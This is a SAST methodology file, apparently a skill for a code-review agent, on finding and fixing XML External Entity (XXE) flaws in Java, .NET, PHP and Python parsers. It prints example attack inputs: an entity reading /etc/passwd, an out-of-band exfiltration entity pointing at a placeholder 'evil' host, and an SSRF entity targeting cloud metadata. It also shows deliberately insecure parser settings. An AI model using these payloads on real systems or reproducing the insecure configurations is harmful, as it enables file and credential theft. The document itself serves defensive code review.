---
name: xxe
description: >-
  SAST detection methodology for XML External Entity injection (CWE-611),
  covering classic file read, blind/OOB exfiltration via parameter entities and
  external DTDs, SSRF via entities, XInclude, billion-laughs DoS overlap, and
  SVG/DOCX/XLSX/SAML/SOAP vectors. Includes parser-specific insecure defaults and
  hardening for Java (SAXParser/DocumentBuilder/XMLInputFactory), .NET (XmlReader/
  XmlDocument DtdProcessing), PHP libxml, and Python (lxml/defusedxml). Use when
  reviewing code that parses XML. Writes confirmed findings to findings/11-xxe.md.
---

# XML External Entity (XXE) — SAST Methodology

**Class:** XXE · **CWE-611** · **OWASP:** A05 Security Misconfiguration
**Findings file:** `findings/11-xxe.md`

## 1. Overview

XXE occurs when an XML parser processes attacker-controlled XML with **external
entity resolution and DTD processing enabled**. A crafted `<!DOCTYPE>` with an
external entity makes the parser fetch a URI — reading local files, hitting
internal services (SSRF), or exfiltrating data out-of-band. The core test: does
untrusted XML reach a parser whose configuration still allows DOCTYPE/external
entities/external DTD loading? Because most XML parsers historically enabled
these by default, XXE is primarily a **secure-configuration** problem: the fix is
disabling DTDs and external entities on the specific parser instance.

## 2. Where it lives

- Any endpoint accepting XML: SOAP/WSDL services, REST APIs accepting
  `application/xml`, XML-RPC, RSS/Atom ingesters.
- File uploads that are secretly XML containers: **SVG**, **DOCX/XLSX/PPTX**
  (OOXML zip of XML), **SVG-in-PDF**, config imports, GPX/KML.
- SSO/identity: **SAML** assertions and metadata; WS-Security/SOAP headers.
- Sitemap/feed parsers, XSLT pipelines, and any `parse`/`load`/`read` on an
  XML DOM/SAX/StAX API.

## 3. Sources (tainted input)

All HTTP inputs carrying XML (body, uploaded files, headers used as XML),
webhook/SAML payloads, and imported documents. **Second-order:** an uploaded XML/
SVG/OOXML stored earlier and parsed later by a worker (thumbnailer, indexer,
converter) — trace it to the upload. Filenames/paths inside archives can also
select which XML gets parsed.

## 4. Sinks (dangerous operations)

```java
// Java — dangerous DEFAULTS (external entities enabled unless disabled)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.newDocumentBuilder().parse(userXml);          // DTDs on → XXE
SAXParserFactory.newInstance().newSAXParser().parse(in, handler);
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.createXMLStreamReader(in);                     // StAX, external entities on
TransformerFactory / Unmarshaller (JAXB) / SAXReader (dom4j/JDOM)  // same risk
```
```csharp
// .NET — dangerous on older frameworks
var doc = new XmlDocument();                       // <=4.5.1 DtdProcessing enabled
doc.Load(userXml);
var xr = XmlReader.Create(stream);                 // if DtdProcessing = Parse + resolver set
```
```php
// PHP — dangerous
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);   // LIBXML_NOENT expands entities!
simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
```
```python
# Python — dangerous
from lxml import etree
etree.parse(userXml, etree.XMLParser(resolve_entities=True, no_network=False))
import xml.dom.minidom, xml.sax                     # stdlib parsers historically resolve entities
```

Example malicious document (all sinks above):
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<r>&x;</r>                                          <!-- classic file read -->
```

Dangerous whenever DTD processing / external general or parameter entities /
external DTD loading is enabled on a parser fed untrusted XML.

## 5. Sanitizers / safe patterns

**Safe:** disable DOCTYPE entirely on the parser instance that reads untrusted
XML. Per stack:
- **Java:** `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
  (best), plus disable `external-general-entities` and `external-parameter-entities`,
  set `XMLConstants.FEATURE_SECURE_PROCESSING`, `setXIncludeAware(false)`,
  `setExpandEntityReferences(false)`; StAX `IS_SUPPORTING_EXTERNAL_ENTITIES=false`,
  `SUPPORT_DTD=false`; set `ACCESS_EXTERNAL_DTD`/`ACCESS_EXTERNAL_SCHEMA` to "".
- **.NET:** `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit,
  XmlResolver = null }`; on `XmlDocument` set `XmlResolver = null` (default-safe
  since 4.5.2).
- **PHP (libxml):** do **not** pass `LIBXML_NOENT`; on older libxml call
  `libxml_disable_entity_loader(true)` before load (external entity loading is
  disabled by default in libxml2 ≥ 2.9).
- **Python:** use **`defusedxml`** wrappers, or `lxml` with
  `XMLParser(resolve_entities=False, no_network=True, load_dtd=False)`.

Prefer a hardened, less-powerful format (JSON) when XML features aren't needed.

**Fails / not a real sanitizer:**
- Disabling entity expansion on one parser factory while another parse path is
  left default (the app has multiple XML entry points).
- **`LIBXML_NOENT` is a trap** — its name suggests "no entities" but it *enables*
  substitution of entities. A frequent self-inflicted XXE.
- Blocking `SYSTEM` general entities but leaving **parameter entities** and
  **external DTD** loading on — enables blind/OOB exfiltration and SSRF.
- Filtering `<!DOCTYPE>` with a regex/string check before parsing — bypassable via
  encoding, whitespace, and UTF-16 BOM tricks.
- Relying on schema validation to "sanitize" — validation runs after entity
  resolution.
- Only setting `FEATURE_SECURE_PROCESSING` (caps expansion/DoS) but not disabling
  external entities — mitigates billion-laughs, not file read/SSRF.

## 6. Detection methodology

1. **Find XML parser construction and parse calls.**
   ```
   rg -n 'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|SAXReader|Unmarshaller|TransformerFactory'
   rg -n 'XmlReader\.Create|new XmlDocument|XmlTextReader|DtdProcessing'
   rg -n 'loadXML|simplexml_load|DOMDocument|LIBXML_NOENT|libxml_disable_entity_loader'
   rg -n 'etree\.(parse|fromstring)|xml\.(dom|sax|etree)|minidom|resolve_entities|defusedxml'
   ```
2. **Confirm untrusted input reaches the parse** (body, upload, SVG/OOXML,
   SAML) — directly or second-order.
3. **Inspect the parser configuration on that instance:** are DOCTYPE / external
   general entities / external parameter entities / external DTD / XInclude
   disabled? Absence of hardening on a parser fed untrusted XML = finding.
4. **Watch for the anti-patterns:** `LIBXML_NOENT`, `resolve_entities=True`,
   `DtdProcessing.Parse` with a non-null resolver, missing `disallow-doctype-decl`.
5. **Classify the achievable variant:** in-band file read (entity echoed back),
   blind/OOB (parameter entity + external DTD), SSRF (entity → internal URL),
   XInclude, or DoS (billion-laughs).
6. **Confirm reachability:** exposed endpoint/worker, reachable (pre-auth?).

## 7. Modern & niche variants

- **Classic file read:** general external entity `SYSTEM "file:///..."` echoed in
  a returned element — direct exfiltration when the parsed value is reflected.
- **Blind / OOB exfiltration:** when nothing is reflected, use **parameter
  entities** plus an attacker-hosted **external DTD** to read a file and smuggle
  its contents into an outbound URL (`file` → param entity → `SYSTEM "http://evil/?%data;"`).
  Works even when the response body reveals nothing. This is why disabling only
  general entities is insufficient.
- **SSRF via entities:** `SYSTEM "http://169.254.169.254/latest/meta-data/..."`
  turns the XML parser into an SSRF client against cloud metadata and internal
  services — often the highest-impact XXE outcome (creds theft).
- **XInclude:** even with DOCTYPE blocked, `<xi:include href="file:///..."/>`
  (when XInclude-aware) pulls in external resources — disable `setXIncludeAware`.
- **Billion-laughs / entity expansion DoS:** nested internal entities expand
  exponentially, exhausting memory — overlaps with `unsafe-parsers-and-yaml`
  (CWE-776). `FEATURE_SECURE_PROCESSING` / entity-expansion limits mitigate this
  specific vector without addressing file read.
- **Container-format vectors:** **SVG** uploads (avatars, image processors),
  **DOCX/XLSX/PPTX** (OOXML is zipped XML parsed server-side), **PDF-with-XMP**,
  **SAML** assertions/metadata, and **SOAP/WS-Security** bodies are all XML that
  reaches a parser — XXE frequently hides behind an "image upload" or "SSO login"
  feature rather than an obvious `application/xml` endpoint. SAML XXE is
  especially severe (pre-auth, on the identity path).

## 8. Common false positives

- Parsers explicitly hardened (`disallow-doctype-decl` true, resolver null,
  `defusedxml`, `DtdProcessing.Prohibit`) on the untrusted path.
- XML that is entirely server-generated/constant, never attacker-influenced.
- Libraries whose current defaults are safe AND no flag re-enables entities
  (e.g. libxml2 ≥ 2.9 without `LIBXML_NOENT`, .NET ≥ 4.5.2 `XmlDocument`).
- Non-XML "XML-looking" formats parsed by a data parser that does not process DTDs.

## 9. Severity & exploitability

Base **High** (arbitrary local file read of sensitive files). **Critical** when
it reaches cloud metadata/internal creds via SSRF, or is pre-auth on the SAML/SSO
path. **Medium/Low** when limited to DoS-only (billion-laughs) or when only blind
timing with no exfiltration channel is reachable. Raise for pre-auth reachable,
lower if strictly internal and authenticated. See `references/severity-model.md`.

## 10. Remediation

Disable DOCTYPE and external entity/DTD resolution on every parser that touches
untrusted XML — `disallow-doctype-decl`/`FEATURE_SECURE_PROCESSING` (Java),
`DtdProcessing.Prohibit` + null resolver (.NET), avoid `LIBXML_NOENT` (PHP),
`defusedxml`/`resolve_entities=False` (Python). Disable XInclude. Prefer JSON
where XML features are unnecessary. Apply consistently across all XML entry
points, including upload/SVG/OOXML/SAML paths.

## 11. Output

Append each confirmed finding to **`findings/11-xxe.md`** using
`references/finding-template.md`. Set `Class: XXE` and `CWE: CWE-611`. In **Chain
potential** note primitives such as *arbitrary file read* (→ leaked secrets/creds
for other chains), *SSRF* (→ cloud-metadata creds, provides the SSRF primitive
another finding may consume), *OOB data exfiltration* (blind read channel), and
*DoS* (billion-laughs). XXE frequently **provides** the SSRF/file-read primitive
that downstream chains **consume**.

**Primitives (controlled):** provides `FILE_READ`,`OUTBOUND_REQUEST`; consumes none

## References
- CWE-611; CWE-776 (entity expansion, cross-listed); OWASP A05:2021 Security
  Misconfiguration; OWASP XXE Prevention Cheat Sheet; `defusedxml` documentation.
